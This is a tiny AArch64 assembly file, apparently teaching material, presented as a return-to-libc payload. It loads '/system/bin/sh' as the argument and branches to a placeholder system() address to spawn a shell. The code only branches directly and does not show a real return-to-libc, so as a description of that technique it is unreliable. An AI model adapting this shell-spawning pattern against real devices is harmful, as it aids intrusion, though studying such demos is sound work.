// ret2libc.s - Demonstrates a return-to-libc attack payload
.global _start
.section .text
_start:
    // Prepare arguments for system() call using dummy addresses.
    ldr x0, =cmd_str       // pointer to command string (e.g., "/system/bin/sh")
    ldr x1, =system_addr   // load the address of system()
    br x1                  // branch to system() to execute the command
.section .data
system_addr: .quad 0x12345678   // Hypothetical address of system() in libc
cmd_str: .asciz "/system/bin/sh"
